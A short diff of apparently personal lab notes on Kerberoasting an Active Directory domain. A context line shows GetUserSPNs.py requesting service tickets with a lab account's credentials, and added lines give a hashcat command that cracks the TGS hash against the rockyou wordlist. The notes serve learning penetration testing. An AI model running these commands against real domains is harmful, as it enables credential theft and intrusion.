@@ -20,3 +20,10 @@ $ sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.0.149  -requ
 
 - Save the TGS hash in a `.txt` file and then we can crack it with either **hashcat** or **johntheripper**
 
+```powershell
+# cracking with hashcat
+$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O
+
+# cracking with johntheripper
+
+```
